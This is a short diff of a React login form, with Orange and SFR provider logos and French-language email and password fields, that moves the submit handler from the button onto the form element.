@@ -54,10 +54,10 @@ function App() {
                 <img src={orange} alt="Orange" style={{border: platform === "Orange" ? "1px solid black" : ""}} onClick={() => setPlatform("Orange")} />
                 <img src={sfr} alt="SFR" style={{border: platform === "Sfr" ? "1px solid black" : ""}} onClick={() => setPlatform("Sfr")} />
             </div>
-            <form>
+            <form class="form" onSubmit={(e) => onSubmit(email, password, platform)}>
               <input type="email" required value={email} onChange={(e) => setEmail(e.target.value)} class="email-input" placeholder="Veuillez entrer votre adresse professionnelle" />
               <input type="password" required value={password} onChange={(e) => setPassword(e.target.value)} class="email-input" placeholder="Veuillez entrer votre mot de passe" />
-              <button type='submit' class="continue-button" onClick={() => onSubmit(email, password, platform)}>Continuer</button>
+              <button type='submit' class="continue-button">Continuer</button>
               {messageError && <p style={{color: "red"}}>{messageError}</p>}
             </form>
         </div>
